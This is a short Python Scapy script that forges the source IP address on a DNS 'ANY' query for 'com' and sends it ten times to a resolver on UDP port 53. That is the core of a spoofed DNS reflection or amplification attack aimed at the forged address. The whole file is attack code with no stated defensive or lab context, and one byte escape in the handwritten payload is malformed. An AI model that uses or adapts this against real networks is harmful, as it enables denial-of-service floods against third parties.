from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
C= RandShort()
D= "\x09\x8d\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x63\0x6f\x6d\x00\x00\xff\x00\x01"

spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=53) / D
send(spoofed_packet, count=10)